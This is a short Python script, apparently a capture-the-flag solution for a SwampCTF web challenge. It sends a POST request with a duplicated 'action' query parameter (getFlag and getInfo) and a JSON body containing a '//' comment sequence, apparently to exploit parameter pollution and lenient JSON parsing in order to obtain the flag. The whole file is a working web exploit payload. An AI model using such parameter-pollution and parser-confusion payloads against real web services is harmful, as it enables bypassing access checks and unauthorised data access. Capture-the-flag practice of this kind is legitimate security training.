import requests as r 

url = "http://chals.swampctf.com:41234"
headers = {
    "Content-Type": "application/json"
}
query = "?action=getFlag&action=getInfo"
data = '{"key": "value",//\n"test":"1"}'

resp=r.post(url+query, headers=headers,data=data)
print(resp.text)
